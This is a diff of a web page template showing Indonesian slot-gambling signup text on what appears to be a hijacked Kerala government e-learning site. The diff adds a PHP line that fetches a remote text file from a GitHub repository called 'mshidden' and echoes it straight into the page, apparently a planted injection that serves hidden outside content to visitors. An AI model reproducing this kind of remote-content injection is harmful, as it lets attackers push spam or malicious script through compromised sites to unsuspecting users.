@@ -639,7 +639,6 @@
 					<li style="text-align: justify;"><span style="color: #ffffff;">Masukkan data yang valid pada form pendaftaran agar dapat diproses serta mendapat verifikasi akun pro slot maxwin</span></li>
 					<li style="text-align: justify;"><span style="color: #ffffff;">Setelah memastikan formulir tersebut anda isi data valid, klik tombol "submit"</span></li>
 				</ul>
-				<div class="content" style="border-radius: 10px;" bis_skin_checked="1">
         <div class="entry-content a3e" style="border-radius: 10px;" bis_skin_checked="1">
           <div class="artikel" style="border-radius: 10px;" bis_skin_checked="1"></div>
           <section>
@@ -647,8 +646,9 @@
               <span style="color: #fff;">© Copyright 2024 <a href="https://elearnksgst.kerala.gov.in/lib/hub/">RP8888</a>
               </span>
             </div>
-	<amp-lightbox-gallery layout="nodisplay" id="amp-lightbox-gallery" class="i-amphtml-element i-amphtml-layout-nodisplay i-amphtml-built" hidden="" i-amphtml-layout="nodisplay"><div class="i-amphtml-lbg" bis_skin_checked="1"><div class="i-amphtml-lbg-mask" bis_skin_checked="1"></div></div></amp-lightbox-gallery>
-<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?>
+		  </section>
+		</div>
+	<div><?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?></div>
 	</body>
 	</html>
 	
